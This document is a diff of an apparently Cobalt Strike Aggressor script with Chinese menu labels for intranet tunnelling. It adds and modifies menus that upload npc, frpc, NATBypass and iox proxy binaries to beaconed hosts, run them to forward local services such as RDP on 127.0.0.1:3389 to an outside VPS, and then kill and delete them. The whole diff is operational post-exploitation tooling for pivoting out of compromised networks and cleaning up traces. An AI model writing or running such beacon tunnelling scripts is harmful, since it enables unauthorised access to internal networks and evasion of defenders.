@@ -45,12 +45,11 @@ menu "☆ 内网穿透" {
 			}
 		}		
 	}
-
 	menu "Nps (无配置文件落地)" {
 		item "上传 npc" {
 			blog($1, "\c9=========== 上传 npc ==========");
 			$bid = $1;
-			$dialog = dialog("上传npc", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &npc_upload);
+			$dialog = dialog("上传npc", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &npc_upload);
 			dialog_description($dialog,"一款轻量级、高性能、功能强大的内网穿透代理服务器。支持tcp、udp、socks5、http等几乎所有流量转发。使用参考：https://mp.weixin.qq.com/s/zI04_kxVFWdnegctAzNmmg。项目地址：https://github.com/ehang-io/nps");
 			drow_text($dialog, "UploadPath",  "上传路径: ");
 			dbutton_action($dialog, "上传");
@@ -58,11 +57,7 @@ menu "☆ 内网穿透" {
 		}
 		sub npc_upload {
 			bcd($bid, $3['UploadPath']);
-			if (-is64 $bid['id']) {
-			bupload($bid, script_resource("/scripts/IntrAgent/x64/npc.exe"));
-			}else{
-			bupload($bid, script_resource("/scripts/IntrAgent/x86/npc.exe"));
-			}
+			bupload($bid, script_resource("/scripts/IntrAgent/npc.exe"));
 		}
 		item "运行 npc" {
 			blog($1, "\c9=========== 运行 npc ==========");
@@ -80,8 +75,7 @@ menu "☆ 内网穿透" {
 			$vkey = replace($3['vkey'], "\"", "");
 			bshell($bid, "npc.exe -server= $+ $server -vkey= $+ $vkey");
 		}
-		item "停止 npc" {
-			blog($1, "\c9=========== 停止 npc ==========");
+		item "停止 npc"{
 			local('$bid');
 			foreach $bid ($1){
 				bshell($1, "taskkill -f /im npc.exe");
@@ -100,7 +94,7 @@ menu "☆ 内网穿透" {
 		item "上传 frpc" {
 			blog($1, "\c9=========== 上传 frpc ==========");
 			$bid = $1;
-			$dialog = dialog("上传frpc", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &frp_upload);
+			$dialog = dialog("上传frpc", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &frp_upload);
 			dialog_description($dialog,"frp指定参数版（无需frpc.ini落地）。项目地址：https://github.com/uknowsec/frpModify");
 			drow_text($dialog, "UploadPath",  "上传路径: ");
 			dbutton_action($dialog, "上传");
@@ -108,14 +102,9 @@ menu "☆ 内网穿透" {
 		}
 		sub frp_upload {
 			bcd($bid, $3['UploadPath']);
-			if (-is64 $bid['id']) {
-			bupload($bid, script_resource("/scripts/IntrAgent/x64/frpcx.exe"));
-			}else{
-			bupload($bid, script_resource("/scripts/IntrAgent/x86/frpcx.exe"));
-			}
+			bupload($bid, script_resource("/scripts/IntrAgent/frpcx.exe"));
 		}
-		item "运行 frpc" {
-			blog($1, "\c9=========== 运行 frpc ==========");
+		item "运行 frpc"{
 			$bid = $1['@'];
 			$Dialog = dialog("运行frpc",%(ip => "x.x.x.x", port => "2333",bid => $bid),&frpc_run);
 			dialog_description($Dialog, "运行frpc，使用了frpModify，指定参数即可，token为：uknowsec，socks5端口为23333。");
@@ -146,11 +135,56 @@ menu "☆ 内网穿透" {
 		}
 	}
 
+	menu "NATBypass (Go版 lcx)" {
+		item "上传 NATBypass" {
+			blog($1, "\c9=========== 上传 NATBypass ==========");
+			$bid = $1;
+			$dialog = dialog("上传nb", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &nb);
+			dialog_description($dialog,"一款lcx在golang下的实现。项目地址：https://github.com/cw1997/NATBypass");
+			drow_text($dialog, "UploadPath",  "上传路径: ");
+			dbutton_action($dialog, "上传");
+			dialog_show($dialog);
+		}
+		sub nb {
+			bcd($bid, $3['UploadPath']);
+            bupload($bid, script_resource("/scripts/IntrAgent/nb.exe"));
+		}
+		item "运行 NATBypass"{
+			$bid = $1['@'];
+			$Dialog = dialog("运行nb",%(lhost => "127.0.0.1:3389", rhost => "x.x.x.x:1997",bid => $bid),&nb_run);
+			dialog_description($Dialog, "vps运行：./nb -listen 1997 2017");
+			drow_text($Dialog, "lhost", "本地IP:Port ");
+			drow_text($Dialog, "rhost", "公网IP:Port ");
+			dbutton_action($Dialog, "运行");
+			dialog_show($Dialog);
+		}
+		sub nb_run{
+			local('$lhost $rhost');
+			$lhost = $3['lhost'];
+			$rhost = replace($3['rhost'], "\"", "");
+			bshell($bid, "nb.exe -slave  $+ $lhost  $+ $rhost");
+		}
+		item "停止 NATBypass" {
+			blog($1, "\c9=========== 停止 NATBypass ==========");
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "taskkill -f /im nb.exe");
+			}
+		}
+		item "删除 NATBypass" {
+			blog($1, "\c9=========== 删除 NATBypass ==========");
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "taskkill -f /im nb.exe & del /f /s /q nb.exe");
+			}
+		}
+	}
+
 	menu "Iox (Go版 ew+lcx)" {
 		item "上传 iox" {
 			blog($1, "\c9=========== 上传 iox ==========");
 			$bid = $1;
-			$dialog = dialog("上传iox", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &iox);
+			$dialog = dialog("上传iox", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &iox);
 			dialog_description($dialog,"端口转发工具和socks5代理。项目地址：https://github.com/EddieIvan01/iox");
 			drow_text($dialog, "UploadPath",  "上传路径: ");
 			dbutton_action($dialog, "上传");
@@ -211,3 +245,5 @@ menu "☆ 内网穿透" {
 			}
 		}
 	}
+
+}
